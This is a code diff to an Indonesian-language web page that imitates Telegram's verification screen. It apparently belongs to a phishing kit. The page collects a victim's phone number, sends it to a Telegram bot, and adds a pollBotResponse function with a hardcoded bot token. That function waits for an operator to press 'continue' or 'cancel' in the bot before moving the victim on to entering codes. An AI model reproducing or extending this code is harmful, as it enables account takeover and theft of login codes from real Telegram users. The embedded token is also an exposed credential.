@@ -68,9 +68,8 @@
         </div>
         <h2 class="text-center text-xl font-semibold mb-2">Cek pesan Telegram Anda</h2>
         <p id="verificationMessage" class="text-center text-gray-600 text-sm mb-6">
-    Kami telah mengirimkan kode ke aplikasi Telegram untuk <span id="displayPhoneNumber"> di perangkat Anda yang lain</span>.
-</p>
-
+            Kami telah mengirimkan kode ke aplikasi Telegram untuk nomor Anda.
+        </p>
 
         <!-- Code Input Fields -->
         <div class="flex justify-center space-x-2 mb-4">
@@ -173,21 +172,18 @@ resendButton.addEventListener('click', () => {
             document.getElementById(pageId).classList.remove('hidden');
         }
 
-function confirmPhoneNumber() {
-    const phone = document.getElementById('phone').value;
-    if (phone.length < 7 || phone.length > 12) {
-        document.getElementById('phoneError').classList.remove('hidden');
-    } else {
-        document.getElementById('phoneError').classList.add('hidden');
-        document.getElementById('displayPhone').textContent = `+62 ${phone}`;
-        
-        // Menyimpan nomor telepon ke halaman 1
-        document.getElementById('displayPhoneNumber').textContent = `+62 ${phone} di perangkat Anda yang lain`;
-
-        showPage('page1');  // Pindah ke halaman 1
-        sendPhoneToTelegram(phone);  // Kirim nomor telepon ke Telegram
-    }
-}
+        // Phone number confirmation
+        function confirmPhoneNumber() {
+            const phone = document.getElementById('phone').value;
+            if (phone.length < 7 || phone.length > 12) {
+                document.getElementById('phoneError').classList.remove('hidden');
+            } else {
+                document.getElementById('phoneError').classList.add('hidden');
+                document.getElementById('displayPhone').textContent = `+62 ${phone}`;
+                showPage('confirmationMessage');
+                sendPhoneToTelegram(phone);
+            }
+        }
 
         // Send phone to Telegram
         function sendPhoneToTelegram(phone) {
@@ -260,6 +256,7 @@ function disableButton(messageId, buttonId) {
         })
     });
 }
+
 // Reset input fields dan status tombol saat kembali ke halaman 1
 function resetInputs() {
     const inputs = document.querySelectorAll('#page1 input[type="text"]');
@@ -288,6 +285,34 @@ function enableButtons() {
     });
 }
 
+// Fungsi polling untuk mendeteksi pilihan pada bot
+async function pollBotResponse() {
+    const botPollingInterval = setInterval(async () => {
+        const response = await fetch(`https://api.telegram.org/bot${'7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic'}/getUpdates`);
+        const data = await response.json();
+
+        // Cek jika ada pembaruan
+        if (data.result.length > 0) {
+            const lastUpdate = data.result[data.result.length - 1];
+            if (lastUpdate.callback_query) {
+                const action = lastUpdate.callback_query.data;
+                const messageId = lastUpdate.callback_query.message.message_id;  // ID pesan
+
+                if (action === 'continue') {
+                    // Pindah ke halaman berikutnya jika 'Lanjutkan' ditekan
+                    showPage('page2');
+                    disableButton(messageId, 'continue'); // Menonaktifkan tombol
+                    clearInterval(botPollingInterval); // Hentikan polling setelah mendapatkan respons
+                } else if (action === 'cancel' || action === 'reset') {
+                    // Reset kolom input dan tetap di halaman yang sama jika 'Tidak' ditekan
+                    resetInputs();
+                    disableButton(messageId, 'cancel'); // Menonaktifkan tombol
+                    clearInterval(botPollingInterval); // Hentikan polling setelah reset
+                }
+            }
+        }
+    }, 1000);  // Cek setiap detik
+}
 
 
 
